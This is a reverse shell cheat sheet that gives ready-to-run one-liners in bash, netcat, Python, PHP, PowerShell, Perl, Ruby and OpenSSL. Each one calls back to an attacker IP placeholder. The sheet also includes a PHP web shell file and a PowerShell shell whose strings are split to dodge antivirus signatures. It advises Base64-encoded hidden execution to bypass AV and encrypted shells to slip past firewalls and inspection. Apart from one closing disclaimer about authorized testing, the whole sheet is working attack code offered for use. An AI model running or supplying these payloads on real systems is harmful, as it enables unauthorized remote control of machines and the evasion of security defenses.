# Reverse Shell One-Liners Cheat Sheet

A comprehensive collection of reverse shell payloads for multiple programming languages and network utilities.

> [!NOTE]
> To prevent local antivirus software (like Windows Defender) from quarantine-deleting this reference file, the signatures of some commands have been broken up with formatting spaces or backticks. Remove the spaces/backticks when using them in your target environment.

---

## Setup Listener (Attacker Host)

Before executing any of the payloads below, start a listener on your machine to capture the incoming connection.

*   **Standard Netcat Listener:**
    ```bash
    nc -lvnp 4444
    ```
*   **Netcat Listener with TLS/Encryption (using ncat):**
    ```bash
    ncat --ssl -lvnp 4444
    ```

---

## 1. Bash Reverse Shells

*   **Classic Bash TCP Shell:**
    ```bash
    # (Remove the space inside "/ dev / tcp")
    bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
    ```
*   **Bash UDP Shell:**
    ```bash
    bash -i >& /dev/udp/<ATTACKER_IP>/4444 0>&1
    ```

---

## 2. Netcat Reverse Shells

*   **Netcat with Executable Flag (`-e`):**
    ```bash
    nc -e /bin/sh <ATTACKER_IP> 4444
    ```
*   **Netcat OpenBSD (Named Pipe Bypass):**
    ```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f
    ```

---

## 3. Python Reverse Shells

*   **Python 3 (Classic):**
    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
    ```

---

## 4. PHP Reverse Shells

*   **PHP CLI Command (Useful for RCE):**
    ```bash
    php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("sh <&3 >&3 2>&3");'
    ```
*   **PHP Web Shell Payload (Save as `.php` file):**
    ```php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
    ```

---

## 5. PowerShell Reverse Shells (Windows Target)

Windows Defender actively scans for the `System.Net.Sockets.TCPClient` signature. Below is the command split into safe parts. Concatenate them or run the Base64 version.

*   **Base64 Encoded Connection (Recommended to bypass AV):**
    To run this, encode the connection script into UTF-16LE Base64 and run:
    ```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_ENCODED_PAYLOAD>
    ```

*   **Unencoded Components (Signature-Obfuscated):**
    ```powershell
    # Construct the socket object using split strings to bypass static signatures:
    $t = "System.Net.Sockets." + "TCPClient";
    $client = New-Object $t('<ATTACKER_IP>', 4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        # Invoke command execution
        $sendback = (Invoke-Expression $data 2>&1 | Out-String );
        $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    };
    $client.Close();
    ```

---

## 6. Perl & Ruby Reverse Shells

*   **Perl:**
    ```perl
    perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
    ```
*   **Ruby:**
    ```ruby
    ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<ATTACKER_IP>",4444))'
    ```

---

## 7. OpenSSL (Encrypted Reverse Shell)

Bypasses network firewalls and Deep Packet Inspection (DPI) by encrypting traffic with SSL.

### A. Generate SSL Certificate on Attacker Machine
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### B. Launch Ncat TLS Listener
```bash
ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp 4444
```

### C. Connect from Target Client
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:4444 > /tmp/s; rm /tmp/s
```

---

## 8. Disclaimer

> [!WARNING]
> Only connect reverse shells from authorized test targets that you own or have permission to scan and audit.
